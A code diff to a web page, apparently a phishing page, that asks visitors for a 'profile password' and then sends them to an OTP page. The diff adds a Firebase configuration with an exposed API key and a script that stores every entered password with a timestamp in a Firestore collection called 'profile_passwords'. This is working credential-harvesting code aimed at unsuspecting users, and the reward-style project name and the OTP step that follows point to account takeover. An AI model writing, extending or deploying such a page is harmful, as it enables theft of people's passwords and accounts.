@@ -59,7 +59,7 @@
       text-align: center;
     }
 
-    .submit-btn a {
+    .submit-btn button {
       background: #f09c19;
       color: #fff;
       font-size: 12px;
@@ -67,12 +67,12 @@
       padding: 8px 18px;
       text-align: center;
       border-radius: 6px;
-      text-decoration: none;
-      display: inline-block;
+      border: none;
+      cursor: pointer;
       transition: background 0.3s ease;
     }
 
-    .submit-btn a:hover {
+    .submit-btn button:hover {
       background: #0f3f55;
     }
 
@@ -90,28 +90,57 @@
   <img src="https://i.ibb.co/vvzRc4ws/Screenshot-2025-04-20-08-31-47-89-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Meri Tasveer">
 
   <div class="form-container">
-    <form onsubmit="return submitProfilePassword()">
+    <form onsubmit="return submitProfilePassword(event)">
       <div class="form-group">
         <label for="profilePass">Enter Profile Password *</label>
         <input type="password" id="profilePass" name="profilePass" required>
       </div>
 
       <div class="submit-btn">
-        <a href="#" onclick="submitIfValid()">Submit</a>
+        <button type="submit">Submit</button>
       </div>
     </form>
 
     <img class="bottom-image" src="https://i.ibb.co/q3n4tF60/Screenshot-2025-04-20-09-17-33-68-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Bottom Image">
   </div>
 
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
   <script>
-    function submitIfValid() {
-      const pass = document.getElementById("profilePass").value.trim();
-      if (pass.length > 0) {
-        window.location.href = "otp3.html";
-      } else {
+    const firebaseConfig = {
+      apiKey: "AIzaSyCxRO9k9P6dzovbF0OugNzp1TF1yuAY1Xg",
+      authDomain: "welcomingrewd.firebaseapp.com",
+      projectId: "welcomingrewd",
+      storageBucket: "welcomingrewd.firebasestorage.app",
+      messagingSenderId: "33456614906",
+      appId: "1:33456614906:web:b5828e5dcb0253cace0843"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+  </script>
+
+  <script>
+    function submitProfilePassword(event) {
+      event.preventDefault();
+      const password = document.getElementById("profilePass").value.trim();
+
+      if (password === "") {
         alert("Please enter your profile password.");
+        return false;
       }
+
+      db.collection("profile_passwords").add({
+        password: password,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(() => {
+        window.location.href = "otp3.html";
+      }).catch((error) => {
+        alert("Error saving to database: " + error.message);
+      });
+
+      return false;
     }
   </script>
 </body>
